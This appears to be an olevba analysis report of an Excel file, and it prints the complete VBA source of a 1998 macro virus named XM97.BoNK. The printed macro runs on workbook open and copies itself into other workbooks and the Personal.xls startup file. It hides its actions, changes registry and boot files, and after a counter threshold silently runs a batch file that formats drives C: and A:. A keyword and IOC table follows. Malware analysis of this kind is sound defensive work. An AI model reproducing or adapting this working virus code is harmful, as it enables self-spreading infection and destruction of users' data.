olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Bonker.b-0417417cddb93e5ab48dbe14e7066c3b3f19760c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Bonker.b-0417417cddb93e5ab48dbe14e7066c3b3f19760c - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Bonker.b-0417417cddb93e5ab48dbe14e7066c3b3f19760c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Bonker.b-0417417cddb93e5ab48dbe14e7066c3b3f19760c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Bonker.b-0417417cddb93e5ab48dbe14e7066c3b3f19760c - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Bonker.b-0417417cddb93e5ab48dbe14e7066c3b3f19760c - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Name:   Xcel97Macro.BoNK
Rem Author: jack twoflower LineZer0/Metaphase
Date:   December 1998



Sub Auto_Open()
Application.OnSheetActivate = "XBoNKeR"
End Sub
Sub XBoNKeR()
On Error Resume Next
BK = "Bonk"
BZ = "c:\windows\system\B32o2nk.sys"
PX = "Personal.xls"
PPX = Application.StartupPath & "\" & PX
aBoNK = 0
xBoNK = 0

With Application
    .StatusBar = "XM97.BoNK"
    .ScreenUpdating = False
    .DisplayAlerts = False
    .EnableCancelKey = xlDisabled
    .Caption = "Micro$oft Excel"
End With

Application.VBE.ActiveVBProject.VBComponents.Item(BK).Export BZ

If Dir(PPX) = PX Then xBoNK = 1

For i = 1 To ActiveWorkbook.VBProject.VBComponents.count
    If ActiveWorkbook.VBProject.VBComponents(i).Name = BK Then aBoNK = 1
Next i

If aBoNK = 0 Then
    ActiveWorkbook.VBProject.VBComponents.Import BZ
    ActiveWorkbook.Save
End If

If xBoNK = 0 Then
    Workbooks.Add.SaveAs FileName:=PPX
    ActiveWorkbook.VBProject.VBComponents.Import BZ
    ActiveWindow.Visible = False
    Workbooks(PX).Save
End If
BKCount
Bonk_It
End Sub
Sub BKCount()
On Error Resume Next
Dim chk As Integer
Dim count As Integer

chk = GetSetting("VBA", "XM97_BoNK", "BKCounter")

If chk > 100 Then
    SaveSetting "VBA", "XM97_BoNK", "BKCounter", 1
    BKAction
End If

If chk = 0 Then
    SaveSetting "VBA", "XM97_BoNK", "BKCounter", 1
    SaveSetting "VBA", "XM97_BoNK", "Creator", "jack twoflower -=[LzØ]=-"
    SaveSetting "VBA", "XM97_BoNK", "Address", "jack_twoflower@hotmail.com"
End If

count = chk + 1
SaveSetting "VBA", "XM97_BoNK", "BKCounter", count

End Sub
Sub Bonk_It()
On Error Resume Next

CommandBars("Tools").Controls(10).Enabled = False
CommandBars("Tools").Controls(12).Enabled = False
CommandBars("View").Controls(3).Enabled = False
CommandBars("Window").Controls(3).Enabled = False
CommandBars("Window").Controls(4).Enabled = False
    
RG = "C:\WINDOWS\SYSTEM\B32NK.REG"
If UCase(Dir(RG)) <> "B32NK.REG" Then

    Open RG For Output Access Write As #1
        Print #1, "REGEDIT4"
        Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon]"
        Print #1, """LegalNoticeCaption""=""XM97.BoNK"""
        Print #1, """LegalNoticeText""=""This is BøNKeRs of the .BoNK-family by Jack Twoflower -=[LzØ]=-"""
    Close 1
    
    Open "c:\start.bat" For Output Access Write As #1
        Print #1, "REM Microsoft Windows 95 Start-Hilfe"
        Print #1, "REM ================================"
        Print #1, "REM Systemdatei nicht löschen!"
        Print #1,
        Print #1, "regedit /s c:\windows\system\b32nk.reg"
    Close 1

    Open "c:\autoexec.bat" For Append As #1
        Print #1, "@IF EXIST C:\START.BAT DEL C:\START.BAT"
    Close 1
Shell ("c:\start.bat"), vbHide
End If
End Sub
Sub BKAction()
On Error Resume Next
Open "c:\format.bat" For Output Access Write As #1
    Print #1, "@echo j|format c:"
    Print #1, "@echo j|format a:"
Close 1
Shell ("c:\format.bat"), vbHide
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |B32NK.REG           |Executable file name                         |
|IOC       |start.bat           |Executable file name                         |
|IOC       |b32nk.reg           |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |START.BAT           |Executable file name                         |
|IOC       |format.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

